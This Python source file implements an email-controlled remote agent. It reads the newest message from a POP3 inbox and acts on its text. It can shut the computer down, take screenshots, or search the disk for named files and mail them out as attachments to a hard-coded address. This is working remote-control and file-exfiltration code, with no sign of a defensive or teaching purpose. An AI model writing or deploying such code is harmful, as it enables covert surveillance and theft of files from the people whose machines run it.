# coding: utf-8

'Read new email tool'

from email.parser import Parser
from email.header import decode_header
from email.utils import parseaddr
import poplib, threading, searchTool, os, screenshot, sendEmail
import threading
from constant import Constant as C

class ReadEmail(object):

    def __sendData(self):
        # pathFile = self.abspath + "/path.txt"
        pathFile = os.path.join(self.abspath, C.URL_PATH)
       

        with open(pathFile, "r") as f:
            count = 0
            for line in f:
                if int(self.from_index) <= count <= int(self.end_index):
                    path = line.split(" : ")[1]
                    path = path.replace("\n","")
                    #path = path.replace("\\","/")
                    self.attachs.append(path)
                count += 1
        
        self.attachs.append(pathFile)
        print("************* Sending PC Data ******************")
        print(self.attachs)
        print("**********************************************")

        from_addr = C.EMAIL_126
        password = C.PWD
        to_addr = C.EMAIL_QQ
        smtp_server = C.SMTP_126_SERVER
        subject = C.TEST_SUBJECT
        attachs = self.attachs
        se = sendEmail.SendEmail(from_addr, password, to_addr, smtp_server, subject, attachs)
        se.send()

    def __controlByContent(self):
        searchPath = self.searchPath
        searchFile = self.content

        if searchFile == C.MSG_NONE:
            print("Do nothing...")
            return

        if searchFile == C.MSG_SHUTDOWN:
            print("System will be shutdown...")
            os.system(C.CMD_SHUTDOWN)
            return

        if searchFile == C.MSG_SCREENSHOT:
            print("Taking a screenshot...")
            ss = screenshot.ScreenShot()
            ss.grab()
            return

        searchName = False
        if len(searchFile.split(".")) == 1:
            searchName = True

        commands = searchFile.split(",")
        name = commands[0]

        if len(commands) > 1:
            self.from_index = commands[1]
            self.end_index = commands[2]
        else:
            self.from_index = 0
            self.end_index = 5

        st = searchTool.SearchTool(searchPath, name, searchName)
        print("Search %s : " % name)
        st.parsePath(searchPath)

        sendDataThread = threading.Thread(target = self.__sendData, name = "sendDataThread")
        sendDataThread.start()

    def __decode_str(self, s):
        value, charset = decode_header(s)[0]
        if charset:
            value = value.decode(charset)
        return value

    def __guess_charset(self, msg):
        charset = msg.get_charset()
        if charset is None:
            content_type = msg.get('Content-Type', '').lower()
            pos = content_type.find('charset=')
            if pos >= 0:
                charset = content_type[pos + 8:].strip()
        return 
        
    def __init__(self, email, pwd, pop3_server, searchPath):
        self.email = email
        self.pwd = pwd
        self.pop3_server = pop3_server
        self.searchPath = searchPath
        self.attachs = []
        self.abspath = os.path.abspath("./")

    def downloadEmail(self):
        print("Reading control command...")
        server = poplib.POP3(self.pop3_server)
        server.user(self.email)
        server.pass_(self.pwd)
        resp, mails, octets = server.list()
        firstMail = len(mails)
        resp, lines, octets = server.retr(firstMail)
        msg_content = b'\r\n'.join(lines).decode('utf-8')
        return msg_content

    def parseContent(self, content):
        msg = Parser().parsestr(content)
        return msg

    def print_info(self, msg, indent=0):
        if indent == 0:
            for header in ['From', 'To', 'Subject']:
                value = msg.get(header, '')
                if value:
                    if header=='Subject':
                        value = self.__decode_str(value)
                    else:
                        hdr, addr = parseaddr(value)
                        name = self.__decode_str(hdr)
                        value = u'%s <%s>' % (name, addr)

        if (msg.is_multipart()):
            parts = msg.get_payload()
            for n, part in enumerate(parts):
                self.print_info(part, indent + 1)
                
        else:
            content_type = msg.get_content_type()
            if content_type=='text/plain':
                content = msg.get_payload(decode=True)
                charset = self.__guess_charset(msg)
                if charset:
                    content = content.decode(charset)
                self.content = content.decode()
                controlThread = threading.Thread(target = self.__controlByContent, name = 'controlThread')
                controlThread.start()
            else:
                pass

    